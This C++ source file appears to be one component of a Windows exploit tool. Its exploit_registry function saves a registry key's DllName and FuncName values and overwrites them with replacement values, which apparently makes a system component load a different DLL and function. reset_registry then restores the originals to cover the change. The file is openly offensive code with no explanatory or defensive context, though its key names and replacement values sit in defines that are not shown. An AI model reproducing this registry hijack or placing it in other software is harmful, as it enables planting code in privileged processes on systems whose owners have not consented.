#include "registry.hpp"

namespace registry
{
	HKEY key = nullptr;
	std::string old_dllname;
	std::string old_funcname;

	void exploit_registry()
	{
		key = util::open_registry_key(key_define);

		old_dllname = util::get_reg_entry(key, DllName_define).data();
		old_funcname = util::get_reg_entry(key, FuncName_define).data();

		util::set_reg_entry(key, DllName_define, new_DllName_define);
		util::set_reg_entry(key, FuncName_define, new_FuncName_define);
	}

	void reset_registry()
	{
		util::set_reg_entry(key, DllName_define, old_dllname);
		util::set_reg_entry(key, FuncName_define, old_funcname);
		RegCloseKey(key);
	}
}

